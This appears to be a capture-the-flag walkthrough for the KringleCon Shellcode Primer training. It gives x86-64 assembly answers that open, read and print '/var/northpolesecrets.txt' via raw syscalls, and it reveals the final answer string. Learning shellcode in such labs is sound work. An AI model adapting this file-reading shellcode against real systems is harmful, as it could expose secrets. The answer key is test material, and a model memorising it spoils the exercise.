## Summary
In Jack's loby (top floor of Jack's tower), click the Shellcode Primer challenge and complete the training at https://tracer.kringlecastle.com/. You'll learn the basics of Shellcode!

## Steps
Complete the 11 Shellcode Primer lessons. 1-10 are good, guided tutorials, while 11 is the challenge. Read everything closely - you can't expect to skim and guess till you pass here. On 11, know that you can assign one REG to another, using `mov REG1, REG2` to move REG2 into REG1 position. So for example, if a syscall returns data into rax, you could move it into rdi by doing `mov rdi, rax`.


<details>
  <summary>Answer to open file</summary>
  
```
; TODO: Get a reference to this
call txt
db '/var/northpolesecrets.txt',0
txt:

; TODO: Call sys_open
mov rax, 2 ;sys_open
pop rdi
mov rsi, 0
mov rdx, 0
syscall
```
  
</details>

<details>
  <summary>Answer to read file</summary>
  
```
; TODO: Call sys_read on the file handle and read it into rsp
mov rdi, rax
mov rax, 0 ;sys_read
mov rdx, 200 ;size_t count
mov rsi, rsp
syscall
```
  
</details>

<details>
  <summary>Answer to write to STDOUT</summary>
  
```
; TODO: Call sys_write to write the contents from rsp to stdout (1)
mov rax, 1;sys_write
mov rdi,1
mov rsi, rsp
mov rdx, 200 ;size_t count
syscall
```
  
</details>

<details>
  <summary>Answer exit cleanly</summary>
  
```
; TODO: Call sys_exit
mov rax, 60;sys_exit
mov rdi, 99;Put the exit_code we want (99) in rdi
syscall
ret
```
  
</details>


<details>
  <summary>Answer</summary>
  Secret to KringleCon success: all of our speakers and organizers, providing the gift of cyber security knowledge, free to the community.
</details>
